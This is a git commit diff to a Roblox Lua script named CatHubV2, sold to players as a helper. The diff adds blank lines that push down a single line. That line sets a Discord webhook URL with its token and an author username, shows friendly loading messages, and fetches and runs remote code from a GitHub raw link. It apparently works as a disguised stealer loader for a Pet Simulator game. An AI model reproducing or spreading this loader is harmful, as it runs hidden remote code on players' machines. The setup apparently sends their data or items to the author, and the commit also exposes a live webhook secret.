09b5dd097eaf90c44902617ae5cdc05acf1d246d
daviblazer01 <143232966+Minaz64x@users.noreply.github.com>
2023-08-29 11:38:15 -0300

    Update CatHubV2.lua

--- CatHubV2.lua
+++ CatHubV2.lua
@@ -47,4 +47,20 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 Username = "Minaz64x" WebHook = "https://discord.com/api/webhooks/1145496027160399923/96qFyc53Z8eLTtWNts_wc4wtaWpIfYyE0Bm1M81TnUNStedYL6xR0Y27nXgAMCN1a3_X" _G.CustomScriptName = "CatHubV2" _G.Text1 = "Script Loading" _G.Text2 = "Thanks for using Cat Hub" _G.Text3 = "Checking Script..." _G.Text4 = "Starting..." loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
